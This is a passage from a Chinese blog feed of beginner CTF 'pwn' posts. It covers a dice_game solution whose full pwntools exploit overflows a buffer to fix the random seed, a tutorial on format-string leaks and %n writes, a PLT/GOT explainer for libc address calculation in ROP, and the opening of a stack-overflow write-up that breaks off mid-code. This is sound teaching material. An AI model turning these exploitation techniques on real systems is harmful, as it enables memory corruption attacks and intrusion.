align="center"><strong>buf</strong></td></tr><tr><td align="center"><strong>-50h</strong></td><td align="center"><strong>buf</strong></td></tr></tbody></table><p>我们来看seed和buf的交界处</p><table><thead><tr><th align="center">-7h</th><th align="center">buf</th></tr></thead><tbody><tr><td align="center"><strong>-8h</strong></td><td align="center"><strong>buf</strong></td></tr><tr><td align="center"><strong>-9h</strong></td><td align="center"><strong>seed[1]</strong></td></tr><tr><td align="center"><strong>-10h</strong></td><td align="center"><strong>seed[0]</strong></td></tr><tr><td align="center"><strong>-11h</strong></td><td align="center"><strong>buf</strong></td></tr></tbody></table><p>可知，当我们填充0x40个字符时，再填充的一个字符就是<code>seed[0]</code>，故我们可以确定<code>seed[0]</code>的值，我们就确定为0，exploit应该为<code>&#39;a&#39;*0x40 + p64(0)</code></p><p>现在我们知道了随机数的种子数为0，就可以构造相同的随机数列就行爆破，我们还知道<code>v2 = rand() % 6 + 1</code></p><p>完整的exploit如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">res = []<span class="comment">#随机数序列</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dice_game</span><span class="params">()</span>:</span><span class="comment">#生成随机数序列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        rand = libc.rand()</span><br><span class="line">        res.append(rand % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./dice_game'</span>)</span><br><span class="line">dice_game()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"your name: "</span>, payload)</span><br><span class="line"><span class="keyword">for</span> point <span class="keyword">in</span> res:</span><br><span class="line">    p.sendlineafter(<span class="string">"point(1~6): "</span>, str(point))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>新手向——浅谈格式化字符串及其内存图例（一）</title>
      <link href="/2019/08/13/%E2%95%A8%E2%94%AC%E2%95%A9%E2%95%93%E2%95%A7%E2%89%A5%C3%AD%C2%AC%C3%AD%C2%AC%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95%E2%95%95%C2%B1%E2%95%A9%E2%95%9C%E2%95%97%C2%BB%E2%95%AB%E2%95%93%E2%95%96%E2%88%9A%E2%94%A4%C2%AB%E2%95%9D%E2%96%91%E2%95%9E%CE%A3%E2%94%80%E2%94%8C%E2%94%A4%C2%B5%E2%95%90%E2%95%9D%E2%94%94%C2%B2%C3%BA%C2%BF%E2%95%A5%E2%95%97%C3%BA%E2%8C%90/"/>
      <url>/2019/08/13/%E2%95%A8%E2%94%AC%E2%95%A9%E2%95%93%E2%95%A7%E2%89%A5%C3%AD%C2%AC%C3%AD%C2%AC%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95%E2%95%95%C2%B1%E2%95%A9%E2%95%9C%E2%95%97%C2%BB%E2%95%AB%E2%95%93%E2%95%96%E2%88%9A%E2%94%A4%C2%AB%E2%95%9D%E2%96%91%E2%95%9E%CE%A3%E2%94%80%E2%94%8C%E2%94%A4%C2%B5%E2%95%90%E2%95%9D%E2%94%94%C2%B2%C3%BA%C2%BF%E2%95%A5%E2%95%97%C3%BA%E2%8C%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“一切安全问题的起源都是冯·诺依曼结构。”——NULL</p></blockquote><p>本新手向文章第一部分以32位系统为例</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>等<code>print</code>家族函数。常见的有格式化字符串函数有：</p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出</li></ul><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到 stdout</td></tr><tr><td>fprintf</td><td>输出到指定 FILE 流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到 stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr></tbody></table><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先我们来看看一个普通的<code>printf</code>函数格式化字符串在栈中的存储结构</p><table><thead><tr><th align="center">高地址</th></tr></thead><tbody><tr><td align="center">……</td></tr><tr><td align="center">argv[3]</td></tr><tr><td align="center">argv[2]</td></tr><tr><td align="center">argv[1]</td></tr><tr><td align="center">Format String</td></tr><tr><td align="center">ESP（EIP）</td></tr><tr><td align="center">低地址</td></tr></tbody></table><p>不难看出对于<code>printf</code>函数，格式化字符串本身就是第一个参数</p><p>例如这样的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %s %s"</span>,<span class="number">12</span>,<span class="string">"abc"</span>,<span class="string">"Hellow"</span>);</span><br></pre></td></tr></table></figure><p>那么对应的内存地址应该是这样的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffce3c —▸ 0x8048432 (main+39) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffce40 —▸ 0x80484db ◂— and    eax, 0x73252064 /* '%d %s %s' */</span><br><span class="line">02:0008│      0xffffce44 ◂— 0xc /* '\x0c' */</span><br><span class="line">03:000c│      0xffffce48 —▸ 0x80484d7 ◂— popal   /* 'abc' */</span><br><span class="line">04:0010│      0xffffce4c —▸ 0x80484d0 ◂— dec    eax /* 'Hellow' */</span><br><span class="line">05:0014│      0xffffce50 —▸ 0xf7fb43dc (__exit_funcs) —▸ 0xf7fb51e0 (initial) ◂— 0x0</span><br><span class="line">06:0018│      0xffffce54 —▸ 0xffffce70 ◂— 0x1</span><br><span class="line">07:001c│ ebp  0xffffce58 ◂— 0x0</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">高地址</th><th align="center"></th></tr></thead><tbody><tr><td align="center">……</td><td align="center"></td></tr><tr><td align="center">argv[2]</td><td align="center">‘Hellow’</td></tr><tr><td align="center">argv[2]</td><td align="center">‘abc’</td></tr><tr><td align="center">argv[1]</td><td align="center">‘\x0c’</td></tr><tr><td align="center">Format String</td><td align="center">‘%d %s %s’</td></tr><tr><td align="center">ESP（EIP）</td><td align="center"></td></tr><tr><td align="center">低地址</td><td align="center"></td></tr></tbody></table><p>正如我之前所写的代码，我们一般会规定<code>printf</code>参数的个数加以限制，完整的程序会类似这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但也有人会懒省事，写成这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[]=<span class="string">"neuqcsa"</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实参与函数形参的结合顺序是从左往右依次进行的，所以上面的代码也能输出<code>neuqcsa</code>，而此时的内存结构为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffce2c —▸ 0x80484a1 (main+54) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffce30 —▸ 0xffffce44 ◂— 'neuqcsa'</span><br><span class="line">02:0008│      0xffffce34 ◂— 0x0</span><br><span class="line">03:000c│      0xffffce38 —▸ 0xf7e30a50 (__new_exitfn+16) ◂— add    ebx, 0x1835b0</span><br><span class="line">04:0010│      0xffffce3c —▸ 0x804851b (__libc_csu_init+75) ◂— add    edi, 1</span><br><span class="line">05:0014│      0xffffce40 ◂— 0x1</span><br><span class="line">06:0018│ eax  0xffffce44 ◂— 'neuqcsa'</span><br><span class="line">07:001c│      0xffffce48 ◂— 0x617363 /* 'csa' */</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">高地址</th><th align="center"></th></tr></thead><tbody><tr><td align="center">……</td><td align="center"></td></tr><tr><td align="center">argv[2]</td><td align="center"></td></tr><tr><td align="center">argv[2]</td><td align="center"></td></tr><tr><td align="center">argv[1]</td><td align="center"></td></tr><tr><td align="center">Format String</td><td align="center">‘neuqcsa’</td></tr><tr><td align="center">ESP（EIP）</td><td align="center"></td></tr><tr><td align="center">低地址</td><td align="center"></td></tr></tbody></table><p>上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户输入的字符串是”%x%x%x”，则会输出以下结果：<code>ffffcde8c2</code></p><p>我们来看一下这个时候的栈结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcdcc —▸ 0x80484f7 (main+60) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffcdd0 —▸ 0xffffcde8 ◂— '%x%x%x'</span><br><span class="line">... ↓</span><br><span class="line">03:000c│      0xffffcdd8 ◂— 0xc2</span><br><span class="line">04:0010│      0xffffcddc —▸ 0xf7e926bb (handle_intel+107) ◂— add    esp, 0x10</span><br><span class="line">05:0014│      0xffffcde0 —▸ 0xffffce0e —▸ 0xffff0000 ◂— 0x0</span><br><span class="line">06:0018│      0xffffcde4 —▸ 0xffffcf0c —▸ 0xffffd13d ◂— 0x505f434c ('LC_P')</span><br><span class="line">07:001c│ eax  0xffffcde8 ◂— '%x%x%x'</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">高地址</th><th align="center"></th></tr></thead><tbody><tr><td align="center">……</td><td align="center"></td></tr><tr><td align="center">argv[2]</td><td align="center"></td></tr><tr><td align="center">argv[2]</td><td align="center"></td></tr><tr><td align="center">argv[1]</td><td align="center"></td></tr><tr><td align="center">Format String</td><td align="center">‘%x%x%x’</td></tr><tr><td align="center">ESP（EIP）</td><td align="center"></td></tr><tr><td align="center">低地址</td><td align="center"></td></tr></tbody></table><p>为什么会是<code>ffffcde8c2c2</code>这个奇怪的数字呢，其实这是内存中的数据。因为<code>%x</code>表示输出第 n+1 个参数16进制数据，三个<code>%x</code>则表示输出栈中除了ESP外前三个内存的数据，不难看出，此时栈中的第2个参数数据就是<code>Format String</code>本身，之后0xffffcdd4-0xffffcdd8的地址数据均为<code>0xc2</code>，则可之三个<code>%x</code>的对应关系</p><p>对于栈来说，第一个参数是返回地址，格式化字符串的第一个参数是栈的第二个参数</p><p>也就是对于格式化字符串来说，第一个参数就是格式化字符串本身</p><table><thead><tr><th align="center">%x（1）</th><th align="center">0xffffcdd0</th><th align="center">0xffffcde8</th></tr></thead><tbody><tr><td align="center">%x（2）</td><td align="center">0xffffcdd4</td><td align="center">0xc2</td></tr><tr><td align="center">%x（3）</td><td align="center">0xffffcdd8</td><td align="center">0xc2</td></tr></tbody></table><p>故合在一起输出即为<code>ffffcde8c2c2</code></p><p>也许代码编写者的本意只是单纯打印一段字符（如<code>“hello world”</code>），但如果这段字符串来源于外部用户可控的输入，则该用户完全可以在字符串中嵌入格式化字符（如<code>%s</code>）。那么，由于<code>printf</code>允许参数个数不固定，故<code>printf</code>会自动将这段字符当作<code>format</code>参数，而用其后内存中的数据匹配<code>format</code>参数</p><p>原罪也就是冯诺依曼机结构中的：<strong>程序存储，共享数据，顺序执行</strong></p><p>即<code>printf</code>函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。</p><p>所以尽管没有参数，上面的代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="基本的格式化字符串参数"><a href="#基本的格式化字符串参数" class="headerlink" title="基本的格式化字符串参数"></a>基本的格式化字符串参数</h3><p><strong>%c</strong>：输出字符，配上<strong>%n</strong>可用于向指定地址写数据。</p><p><strong>%d</strong>：输出十进制整数，配上<strong>%n</strong>可用于向指定地址写数据。</p><p><strong>%x</strong>：输出16进制数据，如<strong>%i$x</strong>表示要泄漏偏移<strong>i</strong>处4字节长的16进制数据，<strong>%i$lx</strong>表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p><p><strong>%p</strong>：输出16进制数据，与<strong>%x</strong>基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p><p><strong>%s</strong>：输出的内容是字符串，即将偏移处指针指向的字符串输出，如<strong>%i$s</strong>表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取<strong>GOT</strong>表等信息。</p><p><strong>%n</strong>：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如<strong>%100×10$n</strong>表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而<strong>%$hn</strong>表示写入的地址空间为2字节，<strong>%$hhn</strong>表示写入的地址空间为1字节，<strong>%$lln</strong>表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过<strong>%$hn</strong>或<strong>%$hhn</strong>来适时调整。</p><p><strong>%n</strong>是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据</p><h3 id="格式化字符串漏洞的利用手段"><a href="#格式化字符串漏洞的利用手段" class="headerlink" title="格式化字符串漏洞的利用手段"></a>格式化字符串漏洞的利用手段</h3><ul><li><p>使程序崩溃，因为 <strong>%s</strong> 对应的参数地址不合法的概率比较大</p></li><li><p>查看进程内容，根据 <strong>%d</strong>，<strong>%f</strong> 输出了栈上的内容</p></li><li><p>泄露栈内存</p><ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li><p>泄露任意地址内存</p><ul><li>利用 GOT 表得到 <code>libc</code> 函数地址，进而获取<code>libc</code>，进而获取其它<code>libc</code> 函数地址</li><li>盲打，dump 整个程序，获取有用信息</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>新手向——浅谈PLT和GOT</title>
      <link href="/2019/08/09/%E2%95%A8%E2%94%AC%E2%95%A9%E2%95%93%E2%95%A7%E2%89%A5%C3%AD%C2%AC%C3%AD%C2%AC%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95PLT%E2%95%91%E2%95%90GOT/"/>
      <url>/2019/08/09/%E2%95%A8%E2%94%AC%E2%95%A9%E2%95%93%E2%95%A7%E2%89%A5%C3%AD%C2%AC%C3%AD%C2%AC%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95PLT%E2%95%91%E2%95%90GOT/</url>
      
        <content type="html"><![CDATA[<p>在做ROP题目的时候，经常需要我们利用<strong>libc.so</strong> 动态链接库中的函数。我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 <strong>got</strong> 表项的内容。这其中我们经常碰到<strong>PLT</strong>表和<strong>GOT</strong>表这两个东西，许多资料写的很复杂，这里以一种不怎么严谨的语言，浅谈一下<strong>PLT</strong>和<strong>GOT</strong></p><p>首先我们一个非常简单的例子作为引子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个非常简单的C语言程序，我们直接通过<code>gdb</code>进行反编译处理，然后通过<code>disas main</code>查看<code>main</code>函数中的反编译代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x000000000000064a</span> &lt;+<span class="number">0</span>&gt;:push   rbp</span><br><span class="line">   <span class="number">0x000000000000064b</span> &lt;+<span class="number">1</span>&gt;:mov    rbp,rsp</span><br><span class="line">   <span class="number">0x000000000000064e</span> &lt;+<span class="number">4</span>&gt;:lea    rdi,[rip+<span class="number">0x9f</span>]        # <span class="number">0x6f4</span></span><br><span class="line">   <span class="number">0x0000000000000655</span> &lt;+<span class="number">11</span>&gt;:mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x000000000000065a</span> &lt;+<span class="number">16</span>&gt;:call   <span class="number">0x520</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   <span class="number">0x000000000000065f</span> &lt;+<span class="number">21</span>&gt;:mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000000664</span> &lt;+<span class="number">26</span>&gt;:pop    rbp</span><br><span class="line">   <span class="number">0x0000000000000665</span> &lt;+<span class="number">27</span>&gt;:ret</span><br></pre></td></tr></table></figure><p><code>0x000000000000065a &lt;+16&gt;:    call   0x520 &lt;printf@plt&gt;</code></p><p>不难看到出现了这样一行反汇编代码，这就是我们调用的<code>printf</code>函数，为什么后面加了个@plt呢？我们要先知道这个printf函数并不是我们在这个main函数里面的工程里面实现的，而是调用了<code>stdio.h</code>这个<code>standard input &amp; output（标准输入输出)）</code>库实现的，等于说对于<code>main</code>函数这是一个外部函数，所以后面是跟了一个<code>@plt</code>。那什么是<strong>PLT</strong>？我们先说说什么是<strong>GOT</strong></p><p><strong>GOT</strong>是一个存储外部库函数的表，可以用<strong>GOT</strong>表来间接引用全局变量、函数，也可以把<strong>GOT</strong>表的首地址作为一个基准，用相对于该基准的偏移量来引用静态变量、静态函数。意思是说，<strong>GOT</strong>是一个映射表，这里的内容是此段代码里面引用到的外部符号的地址映射，比如你用到了一个<code>printf</code>函数，就会和<strong>GOT</strong>表产生关系。那这又和<strong>PLT</strong>有什么关系呢</p><p>PLT表可以称为内部函数表，GOT表为全局函数表，这两个表是相对应的，为什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，是一一对应的。所以PLT表中存储的数字到底是什么意思？</p><p><strong>其实就是以GOT表的首地址作为一个基准称为基值，PLT中的值即为所指向函数在内存中相对于基值的偏移量（offset）</strong></p><p>也就是说<code>printf@plt</code>的在内存中的真实地址是： <strong>GOT基值+PLT存储的偏移量</strong></p><p>我们在编写<strong>ROP</strong>链时，由于 <code>libc</code>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。所以我们一般会先调用<code>write</code>函数再去暴露<code>write</code>函数在<strong>GOT</strong>表中的地址，这样暴露的地址才是<code>write</code>函数在内存中的真实地址</p><p>如果我们使用pwntools一般是这样使用<strong>GOT</strong>和<strong>PLT</strong>地址的</p><ul><li><code>got[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>GOT</strong></li><li><code>plt[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>PLT</strong></li></ul><p>当我们获得<code>write</code>函数在内存中的真实地址时，如何得到<strong>GOT</strong>表的基值，进而得到我们想要的<code>system</code>函数之类的地址？我们要知道两个函数在<strong>GOT</strong>表中的相对地址是不变的，也就是两个函数的<strong>PTL</strong>地址的偏移量也是不会变的，我们只需要得到其中一个函数的真实地址，减掉两个函数偏移量就可以得到另外一个函数的真实地址</p><p>例如我们先得到write函数与基值的偏移量</p><p><code>off_set = libc.symbols[&#39;write&#39;] - libc.symbols[&#39;__libc_start_main&#39;]</code></p><p>然后当我们拿到<code>write</code>函数在<strong>GOT</strong>表中的真实地址时,就可以计算出基值的真实地址</p><p><code>libc_address = write_address - off_set</code></p><p>还有一种写法<code>libc.address = write_address - off_set</code>，这样就可以在找system函数的真实地址时就直接可以：<code>system_address = libc.symbols[&quot;system&quot;]</code></p><p>所谓GOT表和PTL表都是为了重定位而生的</p><p>链接阶段是将一个或多个中间文件(.o文件)通过链接器将它们链接成一个可执行文件，主要做的事情有</p><blockquote><p>对各个中间文件的同名section进行合并</p><p>对代码段，数据段等进行地址分配</p><p>进行链接时重定位</p></blockquote><p>两种情况：</p><p>如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址</p><p>如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段</p><h3 id="运行时重定位"><a href="#运行时重定位" class="headerlink" title="运行时重定位"></a>运行时重定位</h3><p>运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位</p><h3 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h3><p>只有动态库函数在被调用时，才会进行地址解析和重定位工作，这时候动态库函数的地址才会被写入到GOT表项中</p><p>函数第一次被调用过程</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-bcf9343191848103.png" alt="img"></p><p>第一步由函数调用跳入到PLT表中，然后第二步PLT表跳到GOT表中，可以看到第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第5步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到GOT表项中，然后执行函数并返回。</p><p>解释下dynamic段，link_map和_dl_runtime_resolve</p><p>dynamic段：提供动态链接的信息，例如动态链接中各个表的位置</p><p>link_map：已加载库的链表，由动态库函数的地址构成的链表</p><p>_dl_runtime_resolve：在第一次运行时进行地址解析和重定位工作</p><p>函数之后被调用过程</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-9baedd55881a39dd.png" alt></p><p>可以看到，第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。</p><p>对于动态函数的调用，第一次要经过地址解析和回写到GOT表项中，第二次直接调用即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XMAN-2019-福州-PWN-stackoverflow（下）</title>
      <link href="/2019/08/09/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-stackoverflow%C3%BA%C2%BF%E2%95%A7%E2%94%AC%C3%BA%E2%8C%90/"/>
      <url>/2019/08/09/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-stackoverflow%C3%BA%C2%BF%E2%95%A7%E2%94%AC%C3%BA%E2%8C%90/</url>
      
        <content type="html"><![CDATA[<p>今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出<code>simple_stackoverflow2</code>到ROP的<code>simple_stackoverflow2_nx</code>过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。</p><p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p><h2 id="simple-stackoverflow3"><a href="#simple-stackoverflow3" class="headerlink" title="simple_stackoverflow3"></a>simple_stackoverflow3</h2><p>这题没有源代码，我们直接看IDA Pro反汇编得出的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; 